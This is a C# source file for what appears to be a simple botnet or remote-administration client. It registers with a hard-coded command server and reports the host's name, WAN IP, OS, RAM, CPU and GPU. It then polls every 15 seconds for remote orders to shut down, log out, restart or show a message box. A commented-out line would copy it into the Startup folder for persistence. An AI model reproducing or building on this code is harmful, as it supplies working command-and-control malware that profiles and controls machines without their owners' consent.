using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Management;
using UITTimer = System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace ConsoleApplication1
{
    class GlobalVar {
        public static string connection { get; set; }
        public static string guid { get; set; }
    }

    class Program
    {
        static void Main(string[] args)
        {
            GlobalVar.connection = "http://192.168.10.151/";
            //First run?
            string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (File.Exists(AppData + "\\guid.bin")) {
                //Not first run
                GlobalVar.guid = File.ReadAllText(AppData + "\\guid.bin");
                WebClient wClient = new WebClient();
                string webRequest = wClient.DownloadString(GlobalVar.connection + "connect.php?online=1&guid=" + GlobalVar.guid);
                //Start the command thread
                System.Threading.Timer t = new System.Threading.Timer(CommandWait, null, 0, 15000);
                Console.ReadLine();
            }
            else
            {
                //First run
                GlobalVar.guid = Guid.NewGuid().ToString();
                File.WriteAllText(AppData + "\\guid.bin", GlobalVar.guid);
                WebClient wClient = new WebClient();
                string webRequest = wClient.DownloadString(GlobalVar.connection + "connect.php?new=1&guid=" + GlobalVar.guid + "&hostname=" + getHostname() + "&ipaddress=" + getWANIP() + "&os=" + getOS() + "&ram=" + getRAM() + "&processor=" + getProcessor() + "&gpu=" + getGPU());
                //Move to startup folder
                //File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                //Start the command thread
                System.Threading.Timer t = new System.Threading.Timer(CommandWait, null, 0, 15000);
                Console.ReadLine();
            }
        }

        private static void CommandWait(Object o)
        {
            //Report back letting the server know we're online
            WebClient wClient = new WebClient();
            string webRequest = string.Empty;
            webRequest = wClient.DownloadString(GlobalVar.connection + "connect.php?online=1&guid=" + GlobalVar.guid);
            //Request instructions
            webRequest = wClient.DownloadString(GlobalVar.connection + "commands.php?request=1&guid=" + GlobalVar.guid);
            if (webRequest != "N/A") {
                //We have commands. Report back that we have recieved them
                string reportBack = wClient.DownloadString(GlobalVar.connection + "commands.php?respond=1&guid=" + GlobalVar.guid);
                //Carry out the commands
                switch (webRequest) {
                    case "shutdown":
                        Process.Start("cmd.exe", "/c shutdown -s -t 00");
                        break;
                    case "logout":
                        Process.Start("cmd.exe", "/c shutdown -l -t 00");
                        break;
                    case "restart":
                        Process.Start("cmd.exe", "/c shutdown -r -t 00");
                        break;
                    case "msgbox":
                        string msg = wClient.DownloadString(GlobalVar.connection + "commands/msg.php?request=1&guid=" + GlobalVar.guid);
                        string[] msgboxParms = msg.Split('|');
                        MessageBox.Show(msgboxParms[1], msgboxParms[0]);
                        break;
                }
            }

        }

        public static string getProcessor() {
            string cpu = string.Empty;
            string wmiQuery = "SELECT * FROM Win32_Processor";
            ManagementObjectSearcher search = new ManagementObjectSearcher(wmiQuery);
            ManagementObjectCollection MOC = search.Get();
            foreach (ManagementObject MO in MOC) {
                cpu = MO["Name"].ToString();
            }
            return cpu;
        }

        public static string getRAM()
        {
            long ram = 0;
            string wmiQuery = "SELECT * FROM Win32_PhysicalMemory";
            ManagementObjectSearcher search = new ManagementObjectSearcher(wmiQuery);
            ManagementObjectCollection MOC = search.Get();
            foreach (ManagementObject MO in MOC)
            {
                ram = ram + Int64.Parse(MO["Capacity"].ToString());
            }
            ram = ram / 1024;
            ram = ram / 1024;
            ram = ram / 1024;
            Console.WriteLine(ram);
            return ram.ToString();
        }

        public static string getGPU()
        {
            string gpu = string.Empty;
            string wmiQuery = "SELECT * FROM Win32_VideoController";
            ManagementObjectSearcher search = new ManagementObjectSearcher(wmiQuery);
            ManagementObjectCollection MOC = search.Get();
            foreach (ManagementObject MO in MOC)
            {
                gpu = MO["Caption"].ToString();
            }
            Console.WriteLine(gpu);
            return gpu;
        }

        public static string getHostname()
        {
            string hostname = Dns.GetHostName();
            return hostname;
        }

        public static string getWANIP()
        {
            WebClient wClient = new WebClient();
            string wanIP = wClient.DownloadString(GlobalVar.connection + "commands/wanip.php");
            return wanIP;
        }

        public static string getOS()
        {
            string os = Environment.OSVersion.ToString();
            return os;
        }
    }
}
